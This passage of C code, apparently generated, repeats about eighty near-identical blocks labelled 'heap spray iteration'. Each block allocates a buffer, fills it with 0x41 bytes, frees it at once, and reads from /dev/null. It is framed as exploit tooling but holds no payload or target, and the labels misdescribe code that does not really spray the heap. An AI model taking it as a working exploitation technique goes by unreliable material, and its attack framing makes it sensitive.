        printf("[+] Allocated ptr305\\n");
        free(ptr305);
    }
    int fd305 = open("/dev/null", O_RDONLY);
    if (fd305 >= 0) {
        char buf305[256];
        read(fd305, buf305, sizeof(buf305));
        close(fd305);
    }
    // Iteration 307
    printf("[*] Heap spray iteration 307\\n");
    void *ptr306 = malloc(4096);
    if (ptr306) {
        memset(ptr306, 0x41, 4096);
        printf("[+] Allocated ptr306\\n");
        free(ptr306);
    }
    int fd306 = open("/dev/null", O_RDONLY);
    if (fd306 >= 0) {
        char buf306[256];
        read(fd306, buf306, sizeof(buf306));
        close(fd306);
    }
    // Iteration 308
    printf("[*] Heap spray iteration 308\\n");
    void *ptr307 = malloc(4096);
    if (ptr307) {
        memset(ptr307, 0x41, 4096);
        printf("[+] Allocated ptr307\\n");
        free(ptr307);
    }
    int fd307 = open("/dev/null", O_RDONLY);
    if (fd307 >= 0) {
        char buf307[256];
        read(fd307, buf307, sizeof(buf307));
        close(fd307);
    }
    // Iteration 309
    printf("[*] Heap spray iteration 309\\n");
    void *ptr308 = malloc(4096);
    if (ptr308) {
        memset(ptr308, 0x41, 4096);
        printf("[+] Allocated ptr308\\n");
        free(ptr308);
    }
    int fd308 = open("/dev/null", O_RDONLY);
    if (fd308 >= 0) {
        char buf308[256];
        read(fd308, buf308, sizeof(buf308));
        close(fd308);
    }
    // Iteration 310
    printf("[*] Heap spray iteration 310\\n");
    void *ptr309 = malloc(4096);
    if (ptr309) {
        memset(ptr309, 0x41, 4096);
        printf("[+] Allocated ptr309\\n");
        free(ptr309);
    }
    int fd309 = open("/dev/null", O_RDONLY);
    if (fd309 >= 0) {
        char buf309[256];
        read(fd309, buf309, sizeof(buf309));
        close(fd309);
    }
    // Iteration 311
    printf("[*] Heap spray iteration 311\\n");
    void *ptr310 = malloc(4096);
    if (ptr310) {
        memset(ptr310, 0x41, 4096);
        printf("[+] Allocated ptr310\\n");
        free(ptr310);
    }
    int fd310 = open("/dev/null", O_RDONLY);
    if (fd310 >= 0) {
        char buf310[256];
        read(fd310, buf310, sizeof(buf310));
        close(fd310);
    }
    // Iteration 312
    printf("[*] Heap spray iteration 312\\n");
    void *ptr311 = malloc(4096);
    if (ptr311) {
        memset(ptr311, 0x41, 4096);
        printf("[+] Allocated ptr311\\n");
        free(ptr311);
    }
    int fd311 = open("/dev/null", O_RDONLY);
    if (fd311 >= 0) {
        char buf311[256];
        read(fd311, buf311, sizeof(buf311));
        close(fd311);
    }
    // Iteration 313
    printf("[*] Heap spray iteration 313\\n");
    void *ptr312 = malloc(4096);
    if (ptr312) {
        memset(ptr312, 0x41, 4096);
        printf("[+] Allocated ptr312\\n");
        free(ptr312);
    }
    int fd312 = open("/dev/null", O_RDONLY);
    if (fd312 >= 0) {
        char buf312[256];
        read(fd312, buf312, sizeof(buf312));
        close(fd312);
    }
    // Iteration 314
    printf("[*] Heap spray iteration 314\\n");
    void *ptr313 = malloc(4096);
    if (ptr313) {
        memset(ptr313, 0x41, 4096);
        printf("[+] Allocated ptr313\\n");
        free(ptr313);
    }
    int fd313 = open("/dev/null", O_RDONLY);
    if (fd313 >= 0) {
        char buf313[256];
        read(fd313, buf313, sizeof(buf313));
        close(fd313);
    }
    // Iteration 315
    printf("[*] Heap spray iteration 315\\n");
    void *ptr314 = malloc(4096);
    if (ptr314) {
        memset(ptr314, 0x41, 4096);
        printf("[+] Allocated ptr314\\n");
        free(ptr314);
    }
    int fd314 = open("/dev/null", O_RDONLY);
    if (fd314 >= 0) {
        char buf314[256];
        read(fd314, buf314, sizeof(buf314));
        close(fd314);
    }
    // Iteration 316
    printf("[*] Heap spray iteration 316\\n");
    void *ptr315 = malloc(4096);
    if (ptr315) {
        memset(ptr315, 0x41, 4096);
        printf("[+] Allocated ptr315\\n");
        free(ptr315);
    }
    int fd315 = open("/dev/null", O_RDONLY);
    if (fd315 >= 0) {
        char buf315[256];
        read(fd315, buf315, sizeof(buf315));
        close(fd315);
    }
    // Iteration 317
    printf("[*] Heap spray iteration 317\\n");
    void *ptr316 = malloc(4096);
    if (ptr316) {
        memset(ptr316, 0x41, 4096);
        printf("[+] Allocated ptr316\\n");
        free(ptr316);
    }
    int fd316 = open("/dev/null", O_RDONLY);
    if (fd316 >= 0) {
        char buf316[256];
        read(fd316, buf316, sizeof(buf316));
        close(fd316);
    }
    // Iteration 318
    printf("[*] Heap spray iteration 318\\n");
    void *ptr317 = malloc(4096);
    if (ptr317) {
        memset(ptr317, 0x41, 4096);
        printf("[+] Allocated ptr317\\n");
        free(ptr317);
    }
    int fd317 = open("/dev/null", O_RDONLY);
    if (fd317 >= 0) {
        char buf317[256];
        read(fd317, buf317, sizeof(buf317));
        close(fd317);
    }
    // Iteration 319
    printf("[*] Heap spray iteration 319\\n");
    void *ptr318 = malloc(4096);
    if (ptr318) {
        memset(ptr318, 0x41, 4096);
        printf("[+] Allocated ptr318\\n");
        free(ptr318);
    }
    int fd318 = open("/dev/null", O_RDONLY);
    if (fd318 >= 0) {
        char buf318[256];
        read(fd318, buf318, sizeof(buf318));
        close(fd318);
    }
    // Iteration 320
    printf("[*] Heap spray iteration 320\\n");
    void *ptr319 = malloc(4096);
    if (ptr319) {
        memset(ptr319, 0x41, 4096);
        printf("[+] Allocated ptr319\\n");
        free(ptr319);
    }
    int fd319 = open("/dev/null", O_RDONLY);
    if (fd319 >= 0) {
        char buf319[256];
        read(fd319, buf319, sizeof(buf319));
        close(fd319);
    }
    // Iteration 321
    printf("[*] Heap spray iteration 321\\n");
    void *ptr320 = malloc(4096);
    if (ptr320) {
        memset(ptr320, 0x41, 4096);
        printf("[+] Allocated ptr320\\n");
        free(ptr320);
    }
    int fd320 = open("/dev/null", O_RDONLY);
    if (fd320 >= 0) {
        char buf320[256];
        read(fd320, buf320, sizeof(buf320));
        close(fd320);
    }
    // Iteration 322
    printf("[*] Heap spray iteration 322\\n");
    void *ptr321 = malloc(4096);
    if (ptr321) {
        memset(ptr321, 0x41, 4096);
        printf("[+] Allocated ptr321\\n");
        free(ptr321);
    }
    int fd321 = open("/dev/null", O_RDONLY);
    if (fd321 >= 0) {
        char buf321[256];
        read(fd321, buf321, sizeof(buf321));
        close(fd321);
    }
    // Iteration 323
    printf("[*] Heap spray iteration 323\\n");
    void *ptr322 = malloc(4096);
    if (ptr322) {
        memset(ptr322, 0x41, 4096);
        printf("[+] Allocated ptr322\\n");
        free(ptr322);
    }
    int fd322 = open("/dev/null", O_RDONLY);
    if (fd322 >= 0) {
        char buf322[256];
        read(fd322, buf322, sizeof(buf322));
        close(fd322);
    }
    // Iteration 324
    printf("[*] Heap spray iteration 324\\n");
    void *ptr323 = malloc(4096);
    if (ptr323) {
        memset(ptr323, 0x41, 4096);
        printf("[+] Allocated ptr323\\n");
        free(ptr323);
    }
    int fd323 = open("/dev/null", O_RDONLY);
    if (fd323 >= 0) {
        char buf323[256];
        read(fd323, buf323, sizeof(buf323));
        close(fd323);
    }
    // Iteration 325
    printf("[*] Heap spray iteration 325\\n");
    void *ptr324 = malloc(4096);
    if (ptr324) {
        memset(ptr324, 0x41, 4096);
        printf("[+] Allocated ptr324\\n");
        free(ptr324);
    }
    int fd324 = open("/dev/null", O_RDONLY);
    if (fd324 >= 0) {
        char buf324[256];
        read(fd324, buf324, sizeof(buf324));
        close(fd324);
    }
    // Iteration 326
    printf("[*] Heap spray iteration 326\\n");
    void *ptr325 = malloc(4096);
    if (ptr325) {
        memset(ptr325, 0x41, 4096);
        printf("[+] Allocated ptr325\\n");
        free(ptr325);
    }
    int fd325 = open("/dev/null", O_RDONLY);
    if (fd325 >= 0) {
        char buf325[256];
        read(fd325, buf325, sizeof(buf325));
        close(fd325);
    }
    // Iteration 327
    printf("[*] Heap spray iteration 327\\n");
    void *ptr326 = malloc(4096);
    if (ptr326) {
        memset(ptr326, 0x41, 4096);
        printf("[+] Allocated ptr326\\n");
        free(ptr326);
    }
    int fd326 = open("/dev/null", O_RDONLY);
    if (fd326 >= 0) {
        char buf326[256];
        read(fd326, buf326, sizeof(buf326));
        close(fd326);
    }
    // Iteration 328
    printf("[*] Heap spray iteration 328\\n");
    void *ptr327 = malloc(4096);
    if (ptr327) {
        memset(ptr327, 0x41, 4096);
        printf("[+] Allocated ptr327\\n");
        free(ptr327);
    }
    int fd327 = open("/dev/null", O_RDONLY);
    if (fd327 >= 0) {
        char buf327[256];
        read(fd327, buf327, sizeof(buf327));
        close(fd327);
    }
    // Iteration 329
    printf("[*] Heap spray iteration 329\\n");
    void *ptr328 = malloc(4096);
    if (ptr328) {
        memset(ptr328, 0x41, 4096);
        printf("[+] Allocated ptr328\\n");
        free(ptr328);
    }
    int fd328 = open("/dev/null", O_RDONLY);
    if (fd328 >= 0) {
        char buf328[256];
        read(fd328, buf328, sizeof(buf328));
        close(fd328);
    }
    // Iteration 330
    printf("[*] Heap spray iteration 330\\n");
    void *ptr329 = malloc(4096);
    if (ptr329) {
        memset(ptr329, 0x41, 4096);
        printf("[+] Allocated ptr329\\n");
        free(ptr329);
    }
    int fd329 = open("/dev/null", O_RDONLY);
    if (fd329 >= 0) {
        char buf329[256];
        read(fd329, buf329, sizeof(buf329));
        close(fd329);
    }
    // Iteration 331
    printf("[*] Heap spray iteration 331\\n");
    void *ptr330 = malloc(4096);
    if (ptr330) {
        memset(ptr330, 0x41, 4096);
        printf("[+] Allocated ptr330\\n");
        free(ptr330);
    }
    int fd330 = open("/dev/null", O_RDONLY);
    if (fd330 >= 0) {
        char buf330[256];
        read(fd330, buf330, sizeof(buf330));
        close(fd330);
    }
    // Iteration 332
    printf("[*] Heap spray iteration 332\\n");
    void *ptr331 = malloc(4096);
    if (ptr331) {
        memset(ptr331, 0x41, 4096);
        printf("[+] Allocated ptr331\\n");
        free(ptr331);
    }
    int fd331 = open("/dev/null", O_RDONLY);
    if (fd331 >= 0) {
        char buf331[256];
        read(fd331, buf331, sizeof(buf331));
        close(fd331);
    }
    // Iteration 333
    printf("[*] Heap spray iteration 333\\n");
    void *ptr332 = malloc(4096);
    if (ptr332) {
        memset(ptr332, 0x41, 4096);
        printf("[+] Allocated ptr332\\n");
        free(ptr332);
    }
    int fd332 = open("/dev/null", O_RDONLY);
    if (fd332 >= 0) {
        char buf332[256];
        read(fd332, buf332, sizeof(buf332));
        close(fd332);
    }
    // Iteration 334
    printf("[*] Heap spray iteration 334\\n");
    void *ptr333 = malloc(4096);
    if (ptr333) {
        memset(ptr333, 0x41, 4096);
        printf("[+] Allocated ptr333\\n");
        free(ptr333);
    }
    int fd333 = open("/dev/null", O_RDONLY);
    if (fd333 >= 0) {
        char buf333[256];
        read(fd333, buf333, sizeof(buf333));
        close(fd333);
    }
    // Iteration 335
    printf("[*] Heap spray iteration 335\\n");
    void *ptr334 = malloc(4096);
    if (ptr334) {
        memset(ptr334, 0x41, 4096);
        printf("[+] Allocated ptr334\\n");
        free(ptr334);
    }
    int fd334 = open("/dev/null", O_RDONLY);
    if (fd334 >= 0) {
        char buf334[256];
        read(fd334, buf334, sizeof(buf334));
        close(fd334);
    }
    // Iteration 336
    printf("[*] Heap spray iteration 336\\n");
    void *ptr335 = malloc(4096);
    if (ptr335) {
        memset(ptr335, 0x41, 4096);
        printf("[+] Allocated ptr335\\n");
        free(ptr335);
    }
    int fd335 = open("/dev/null", O_RDONLY);
    if (fd335 >= 0) {
        char buf335[256];
        read(fd335, buf335, sizeof(buf335));
        close(fd335);
    }
    // Iteration 337
    printf("[*] Heap spray iteration 337\\n");
    void *ptr336 = malloc(4096);
    if (ptr336) {
        memset(ptr336, 0x41, 4096);
        printf("[+] Allocated ptr336\\n");
        free(ptr336);
    }
    int fd336 = open("/dev/null", O_RDONLY);
    if (fd336 >= 0) {
        char buf336[256];
        read(fd336, buf336, sizeof(buf336));
        close(fd336);
    }
    // Iteration 338
    printf("[*] Heap spray iteration 338\\n");
    void *ptr337 = malloc(4096);
    if (ptr337) {
        memset(ptr337, 0x41, 4096);
        printf("[+] Allocated ptr337\\n");
        free(ptr337);
    }
    int fd337 = open("/dev/null", O_RDONLY);
    if (fd337 >= 0) {
        char buf337[256];
        read(fd337, buf337, sizeof(buf337));
        close(fd337);
    }
    // Iteration 339
    printf("[*] Heap spray iteration 339\\n");
    void *ptr338 = malloc(4096);
    if (ptr338) {
        memset(ptr338, 0x41, 4096);
        printf("[+] Allocated ptr338\\n");
        free(ptr338);
    }
    int fd338 = open("/dev/null", O_RDONLY);
    if (fd338 >= 0) {
        char buf338[256];
        read(fd338, buf338, sizeof(buf338));
        close(fd338);
    }
    // Iteration 340
    printf("[*] Heap spray iteration 340\\n");
    void *ptr339 = malloc(4096);
    if (ptr339) {
        memset(ptr339, 0x41, 4096);
        printf("[+] Allocated ptr339\\n");
        free(ptr339);
    }
    int fd339 = open("/dev/null", O_RDONLY);
    if (fd339 >= 0) {
        char buf339[256];
        read(fd339, buf339, sizeof(buf339));
        close(fd339);
    }
    // Iteration 341
    printf("[*] Heap spray iteration 341\\n");
    void *ptr340 = malloc(4096);
    if (ptr340) {
        memset(ptr340, 0x41, 4096);
        printf("[+] Allocated ptr340\\n");
        free(ptr340);
    }
    int fd340 = open("/dev/null", O_RDONLY);
    if (fd340 >= 0) {
        char buf340[256];
        read(fd340, buf340, sizeof(buf340));
        close(fd340);
    }
    // Iteration 342
    printf("[*] Heap spray iteration 342\\n");
    void *ptr341 = malloc(4096);
    if (ptr341) {
        memset(ptr341, 0x41, 4096);
        printf("[+] Allocated ptr341\\n");
        free(ptr341);
    }
    int fd341 = open("/dev/null", O_RDONLY);
    if (fd341 >= 0) {
        char buf341[256];
        read(fd341, buf341, sizeof(buf341));
        close(fd341);
    }
    // Iteration 343
    printf("[*] Heap spray iteration 343\\n");
    void *ptr342 = malloc(4096);
    if (ptr342) {
        memset(ptr342, 0x41, 4096);
        printf("[+] Allocated ptr342\\n");
        free(ptr342);
    }
    int fd342 = open("/dev/null", O_RDONLY);
    if (fd342 >= 0) {
        char buf342[256];
        read(fd342, buf342, sizeof(buf342));
        close(fd342);
    }
    // Iteration 344
    printf("[*] Heap spray iteration 344\\n");
    void *ptr343 = malloc(4096);
    if (ptr343) {
        memset(ptr343, 0x41, 4096);
        printf("[+] Allocated ptr343\\n");
        free(ptr343);
    }
    int fd343 = open("/dev/null", O_RDONLY);
    if (fd343 >= 0) {
        char buf343[256];
        read(fd343, buf343, sizeof(buf343));
        close(fd343);
    }
    // Iteration 345
    printf("[*] Heap spray iteration 345\\n");
    void *ptr344 = malloc(4096);
    if (ptr344) {
        memset(ptr344, 0x41, 4096);
        printf("[+] Allocated ptr344\\n");
        free(ptr344);
    }
    int fd344 = open("/dev/null", O_RDONLY);
    if (fd344 >= 0) {
        char buf344[256];
        read(fd344, buf344, sizeof(buf344));
        close(fd344);
    }
    // Iteration 346
    printf("[*] Heap spray iteration 346\\n");
    void *ptr345 = malloc(4096);
    if (ptr345) {
        memset(ptr345, 0x41, 4096);
        printf("[+] Allocated ptr345\\n");
        free(ptr345);
    }
    int fd345 = open("/dev/null", O_RDONLY);
    if (fd345 >= 0) {
        char buf345[256];
        read(fd345, buf345, sizeof(buf345));
        close(fd345);
    }
    // Iteration 347
    printf("[*] Heap spray iteration 347\\n");
    void *ptr346 = malloc(4096);
    if (ptr346) {
        memset(ptr346, 0x41, 4096);
        printf("[+] Allocated ptr346\\n");
        free(ptr346);
    }
    int fd346 = open("/dev/null", O_RDONLY);
    if (fd346 >= 0) {
        char buf346[256];
        read(fd346, buf346, sizeof(buf346));
        close(fd346);
    }
    // Iteration 348
    printf("[*] Heap spray iteration 348\\n");
    void *ptr347 = malloc(4096);
    if (ptr347) {
        memset(ptr347, 0x41, 4096);
        printf("[+] Allocated ptr347\\n");
        free(ptr347);
    }
    int fd347 = open("/dev/null", O_RDONLY);
    if (fd347 >= 0) {
        char buf347[256];
        read(fd347, buf347, sizeof(buf347));
        close(fd347);
    }
    // Iteration 349
    printf("[*] Heap spray iteration 349\\n");
    void *ptr348 = malloc(4096);
    if (ptr348) {
        memset(ptr348, 0x41, 4096);
        printf("[+] Allocated ptr348\\n");
        free(ptr348);
    }
    int fd348 = open("/dev/null", O_RDONLY);
    if (fd348 >= 0) {
        char buf348[256];
        read(fd348, buf348, sizeof(buf348));
        close(fd348);
    }
    // Iteration 350
    printf("[*] Heap spray iteration 350\\n");
    void *ptr349 = malloc(4096);
    if (ptr349) {
        memset(ptr349, 0x41, 4096);
        printf("[+] Allocated ptr349\\n");
        free(ptr349);
    }
    int fd349 = open("/dev/null", O_RDONLY);
    if (fd349 >= 0) {
        char buf349[256];
        read(fd349, buf349, sizeof(buf349));
        close(fd349);
    }
    // Iteration 351
    printf("[*] Heap spray iteration 351\\n");
    void *ptr350 = malloc(4096);
    if (ptr350) {
        memset(ptr350, 0x41, 4096);
        printf("[+] Allocated ptr350\\n");
        free(ptr350);
    }
    int fd350 = open("/dev/null", O_RDONLY);
    if (fd350 >= 0) {
        char buf350[256];
        read(fd350, buf350, sizeof(buf350));
        close(fd350);
    }
    // Iteration 352
    printf("[*] Heap spray iteration 352\\n");
    void *ptr351 = malloc(4096);
    if (ptr351) {
        memset(ptr351, 0x41, 4096);
        printf("[+] Allocated ptr351\\n");
        free(ptr351);
    }
    int fd351 = open("/dev/null", O_RDONLY);
    if (fd351 >= 0) {
        char buf351[256];
        read(fd351, buf351, sizeof(buf351));
        close(fd351);
    }
    // Iteration 353
    printf("[*] Heap spray iteration 353\\n");
    void *ptr352 = malloc(4096);
    if (ptr352) {
        memset(ptr352, 0x41, 4096);
        printf("[+] Allocated ptr352\\n");
        free(ptr352);
    }
    int fd352 = open("/dev/null", O_RDONLY);
    if (fd352 >= 0) {
        char buf352[256];
        read(fd352, buf352, sizeof(buf352));
        close(fd352);
    }
    // Iteration 354
    printf("[*] Heap spray iteration 354\\n");
    void *ptr353 = malloc(4096);
    if (ptr353) {
        memset(ptr353, 0x41, 4096);
        printf("[+] Allocated ptr353\\n");
        free(ptr353);
    }
    int fd353 = open("/dev/null", O_RDONLY);
    if (fd353 >= 0) {
        char buf353[256];
        read(fd353, buf353, sizeof(buf353));
        close(fd353);
    }
    // Iteration 355
    printf("[*] Heap spray iteration 355\\n");
    void *ptr354 = malloc(4096);
    if (ptr354) {
        memset(ptr354, 0x41, 4096);
        printf("[+] Allocated ptr354\\n");
        free(ptr354);
    }
    int fd354 = open("/dev/null", O_RDONLY);
    if (fd354 >= 0) {
        char buf354[256];
        read(fd354, buf354, sizeof(buf354));
        close(fd354);
    }
    // Iteration 356
    printf("[*] Heap spray iteration 356\\n");
    void *ptr355 = malloc(4096);
    if (ptr355) {
        memset(ptr355, 0x41, 4096);
        printf("[+] Allocated ptr355\\n");
        free(ptr355);
    }
    int fd355 = open("/dev/null", O_RDONLY);
    if (fd355 >= 0) {
        char buf355[256];
        read(fd355, buf355, sizeof(buf355));
        close(fd355);
    }
    // Iteration 357
    printf("[*] Heap spray iteration 357\\n");
    void *ptr356 = malloc(4096);
    if (ptr356) {
        memset(ptr356, 0x41, 4096);
        printf("[+] Allocated ptr356\\n");
        free(ptr356);
    }
    int fd356 = open("/dev/null", O_RDONLY);
    if (fd356 >= 0) {
        char buf356[256];
        read(fd356, buf356, sizeof(buf356));
        close(fd356);
    }
    // Iteration 358
    printf("[*] Heap spray iteration 358\\n");
    void *ptr357 = malloc(4096);
    if (ptr357) {
        memset(ptr357, 0x41, 4096);
        printf("[+] Allocated ptr357\\n");
        free(ptr357);
    }
    int fd357 = open("/dev/null", O_RDONLY);
    if (fd357 >= 0) {
        char buf357[256];
        read(fd357, buf357, sizeof(buf357));
        close(fd357);
    }
    // Iteration 359
    printf("[*] Heap spray iteration 359\\n");
    void *ptr358 = malloc(4096);
    if (ptr358) {
        memset(ptr358, 0x41, 4096);
        printf("[+] Allocated ptr358\\n");
        free(ptr358);
    }
    int fd358 = open("/dev/null", O_RDONLY);
    if (fd358 >= 0) {
        char buf358[256];
        read(fd358, buf358, sizeof(buf358));
        close(fd358);
    }
    // Iteration 360
    printf("[*] Heap spray iteration 360\\n");
    void *ptr359 = malloc(4096);
    if (ptr359) {
        memset(ptr359, 0x41, 4096);
        printf("[+] Allocated ptr359\\n");
        free(ptr359);
    }
    int fd359 = open("/dev/null", O_RDONLY);
    if (fd359 >= 0) {
        char buf359[256];
        read(fd359, buf359, sizeof(buf359));
        close(fd359);
    }
    // Iteration 361
    printf("[*] Heap spray iteration 361\\n");
    void *ptr360 = malloc(4096);
    if (ptr360) {
        memset(ptr360, 0x41, 4096);
        printf("[+] Allocated ptr360\\n");
        free(ptr360);
    }
    int fd360 = open("/dev/null", O_RDONLY);
    if (fd360 >= 0) {
        char buf360[256];
        read(fd360, buf360, sizeof(buf360));
        close(fd360);
    }
    // Iteration 362
    printf("[*] Heap spray iteration 362\\n");
    void *ptr361 = malloc(4096);
    if (ptr361) {
        memset(ptr361, 0x41, 4096);
        printf("[+] Allocated ptr361\\n");
        free(ptr361);
    }
    int fd361 = open("/dev/null", O_RDONLY);
    if (fd361 >= 0) {
        char buf361[256];
        read(fd361, buf361, sizeof(buf361));
        close(fd361);
    }
    // Iteration 363
    printf("[*] Heap spray iteration 363\\n");
    void *ptr362 = malloc(4096);
    if (ptr362) {
        memset(ptr362, 0x41, 4096);
        printf("[+] Allocated ptr362\\n");
        free(ptr362);
    }
    int fd362 = open("/dev/null", O_RDONLY);
    if (fd362 >= 0) {
        char buf362[256];
        read(fd362, buf362, sizeof(buf362));
        close(fd362);
    }
    // Iteration 364
    printf("[*] Heap spray iteration 364\\n");
    void *ptr363 = malloc(4096);
    if (ptr363) {
        memset(ptr363, 0x41, 4096);
        printf("[+] Allocated ptr363\\n");
        free(ptr363);
    }
    int fd363 = open("/dev/null", O_RDONLY);
    if (fd363 >= 0) {
        char buf363[256];
        read(fd363, buf363, sizeof(buf363));
        close(fd363);
    }
    // Iteration 365
    printf("[*] Heap spray iteration 365\\n");
    void *ptr364 = malloc(4096);
    if (ptr364) {
        memset(ptr364, 0x41, 4096);
        printf("[+] Allocated ptr364\\n");
        free(ptr364);
    }
    int fd364 = open("/dev/null", O_RDONLY);
    if (fd364 >= 0) {
        char buf364[256];
        read(fd364, buf364, sizeof(buf364));
        close(fd364);
    }
    // Iteration 366
    printf("[*] Heap spray iteration 366\\n");
    void *ptr365 = malloc(4096);
    if (ptr365) {
        memset(ptr365, 0x41, 4096);
        printf("[+] Allocated ptr365\\n");
        free(ptr365);
    }
    int fd365 = open("/dev/null", O_RDONLY);
    if (fd365 >= 0) {
        char buf365[256];
        read(fd365, buf365, sizeof(buf365));
        close(fd365);
    }
    // Iteration 367
    printf("[*] Heap spray iteration 367\\n");
    void *ptr366 = malloc(4096);
    if (ptr366) {
        memset(ptr366, 0x41, 4096);
        printf("[+] Allocated ptr366\\n");
        free(ptr366);
    }
    int fd366 = open("/dev/null", O_RDONLY);
    if (fd366 >= 0) {
        char buf366[256];
        read(fd366, buf366, sizeof(buf366));
        close(fd366);
    }
    // Iteration 368
    printf("[*] Heap spray iteration 368\\n");
    void *ptr367 = malloc(4096);
    if (ptr367) {
        memset(ptr367, 0x41, 4096);
        printf("[+] Allocated ptr367\\n");
        free(ptr367);
    }
    int fd367 = open("/dev/null", O_RDONLY);
    if (fd367 >= 0) {
        char buf367[256];
        read(fd367, buf367, sizeof(buf367));
        close(fd367);
    }
    // Iteration 369
    printf("[*] Heap spray iteration 369\\n");
    void *ptr368 = malloc(4096);
    if (ptr368) {
        memset(ptr368, 0x41, 4096);
        printf("[+] Allocated ptr368\\n");
        free(ptr368);
    }
    int fd368 = open("/dev/null", O_RDONLY);
    if (fd368 >= 0) {
        char buf368[256];
        read(fd368, buf368, sizeof(buf368));
        close(fd368);
    }
    // Iteration 370
    printf("[*] Heap spray iteration 370\\n");
    void *ptr369 = malloc(4096);
    if (ptr369) {
        memset(ptr369, 0x41, 4096);
        printf("[+] Allocated ptr369\\n");
        free(ptr369);
    }
    int fd369 = open("/dev/null", O_RDONLY);
    if (fd369 >= 0) {
        char buf369[256];
        read(fd369, buf369, sizeof(buf369));
        close(fd369);
    }
    // Iteration 371
    printf("[*] Heap spray iteration 371\\n");
    void *ptr370 = malloc(4096);
    if (ptr370) {
        memset(ptr370, 0x41, 4096);
        printf("[+] Allocated ptr370\\n");
        free(ptr370);
    }
    int fd370 = open("/dev/null", O_RDONLY);
    if (fd370 >= 0) {
        char buf370[256];
        read(fd370, buf370, sizeof(buf370));
        close(fd370);
    }
    // Iteration 372
    printf("[*] Heap spray iteration 372\\n");
    void *ptr371 = malloc(4096);
    if (ptr371) {
        memset(ptr371, 0x41, 4096);
        printf("[+] Allocated ptr371\\n");
        free(ptr371);
    }
    int fd371 = open("/dev/null", O_RDONLY);
    if (fd371 >= 0) {
        char buf371[256];
        read(fd371, buf371, sizeof(buf371));
        close(fd371);
    }
    // Iteration 373
    printf("[*] Heap spray iteration 373\\n");
    void *ptr372 = malloc(4096);
    if (ptr372) {
        memset(ptr372, 0x41, 4096);
        printf("[+] Allocated ptr372\\n");
        free(ptr372);
    }
    int fd372 = open("/dev/null", O_RDONLY);
    if (fd372 >= 0) {
        char buf372[256];
        read(fd372, buf372, sizeof(buf372));
        close(fd372);
    }
    // Iteration 374
    printf("[*] Heap spray iteration 374\\n");
    void *ptr373 = malloc(4096);
    if (ptr373) {
        memset(ptr373, 0x41, 4096);
        printf("[+] Allocated ptr373\\n");
        free(ptr373);
    }
    int fd373 = open("/dev/null", O_RDONLY);
    if (fd373 >= 0) {
        char buf373[256];
        read(fd373, buf373, sizeof(buf373));
        close(fd373);
    }
    // Iteration 375
    printf("[*] Heap spray iteration 375\\n");
    void *ptr374 = malloc(4096);
    if (ptr374) {
        memset(ptr374, 0x41, 4096);
        printf("[+] Allocated ptr374\\n");
        free(ptr374);
    }
    int fd374 = open("/dev/null", O_RDONLY);
    if (fd374 >= 0) {
        char buf374[256];
        read(fd374, buf374, sizeof(buf374));
        close(fd374);
    }
    // Iteration 376
    printf("[*] Heap spray iteration 376\\n");
    void *ptr375 = malloc(4096);
    if (ptr375) {
        memset(ptr375, 0x41, 4096);
        printf("[+] Allocated ptr375\\n");
        free(ptr375);
    }
    int fd375 = open("/dev/null", O_RDONLY);
    if (fd375 >= 0) {
        char buf375[256];
        read(fd375, buf375, sizeof(buf375));
        close(fd375);
    }
    // Iteration 377
    printf("[*] Heap spray iteration 377\\n");
    void *ptr376 = malloc(4096);
    if (ptr376) {
        memset(ptr376, 0x41, 4096);
        printf("[+] Allocated ptr376\\n");
        free(ptr376);
    }
    int fd376 = open("/dev/null", O_RDONLY);
    if (fd376 >= 0) {
        char buf376[256];
        read(fd376, buf376, sizeof(buf376));
        close(fd376);
    }
    // Iteration 378
    printf("[*] Heap spray iteration 378\\n");
    void *ptr377 = malloc(4096);
    if (ptr377) {
        memset(ptr377, 0x41, 4096);
        printf("[+] Allocated ptr377\\n");
        free(ptr377);
    }
    int fd377 = open("/dev/null", O_RDONLY);
    if (fd377 >= 0) {
        char buf377[256];
        read(fd377, buf377, sizeof(buf377));
        close(fd377);
    }
    // Iteration 379
    printf("[*] Heap spray iteration 379\\n");
    void *ptr378 = malloc(4096);
    if (ptr378) {
        memset(ptr378, 0x41, 4096);
        printf("[+] Allocated ptr378\\n");
        free(ptr378);
    }
    int fd378 = open("/dev/null", O_RDONLY);
    if (fd378 >= 0) {
        char buf378[256];
        read(fd378, buf378, sizeof(buf378));
        close(fd378);
    }
    // Iteration 380
    printf("[*] Heap spray iteration 380\\n");
    void *ptr379 = malloc(4096);
    if (ptr379) {
        memset(ptr379, 0x41, 4096);
        printf("[+] Allocated ptr379\\n");
        free(ptr379);
    }
    int fd379 = open("/dev/null", O_RDONLY);
    if (fd379 >= 0) {
        char buf379[256];
        read(fd379, buf379, sizeof(buf379));
        close(fd379);
    }
    // Iteration 381
    printf("[*] Heap spray iteration 381\\n");
    void *ptr380 = malloc(4096);
    if (ptr380) {
        memset(ptr380, 0x41, 4096);
        printf("[+] Allocated ptr380\\n");
        free(ptr380);
    }
    int fd380 = open("/dev/null", O_RDONLY);
    if (fd380 >= 0) {
        char buf380[256];
        read(fd380, buf380, sizeof(buf380));
        close(fd380);
    }
    // Iteration 382
    printf("[*] Heap spray iteration 382\\n");
    void *ptr381 = malloc(4096);
    if (ptr381) {
        memset(ptr381, 0x41, 4096);
        printf("[+] Allocated ptr381\\n");
        free(ptr381);
    }
    int fd381 = open("/dev/null", O_RDONLY);
    if (fd381 >= 0) {
        char buf381[256];
        read(fd381, buf381, sizeof(buf381));
        close(fd381);
    }
    // Iteration 383
    printf("[*] Heap spray iteration 383\\n");
    void *ptr382 = malloc(4096);
    if (ptr382) {
        memset(ptr382, 0x41, 4096);
        printf("[+] Allocated ptr382\\n");
        free(ptr382);
    }
    int fd382 = open("/dev/null", O_RDONLY);
    if (fd382 >= 0) {
        char buf382[256];
        read(fd382, buf382, sizeof(buf382));
        close(fd382);
    }
    // Iteration 384
    printf("[*] Heap spray iteration 384\\n");
    void *ptr383 = malloc(4096);
    if (ptr383) {
        memset(ptr383, 0x41, 4096);
        printf("[+] Allocated ptr383\\n");
        free(ptr383);
    }
    int fd383 = open("/dev/null", O_RDONLY);
    if (fd383 >= 0) {
        char buf383[256];
        read(fd383, buf383, sizeof(buf383));
        close(fd383);
    }
    // Iteration 385
    printf("[*] Heap spray iteration 385\\n");
    void *ptr384 = malloc(4096);
    if (ptr384) {
        memset(ptr384, 0x41, 4096);
        printf("[+] Allocated ptr384\\n");
        free(ptr384);
    }
    int fd384 = open("/dev/null", O_RDONLY);
    if (fd384 >= 0) {
        char buf384[256];
        read(fd384, buf384, sizeof(buf384));
        close(fd384);
    }
    // Iteration 386
    printf("[*] Heap spray iteration 386\\n");
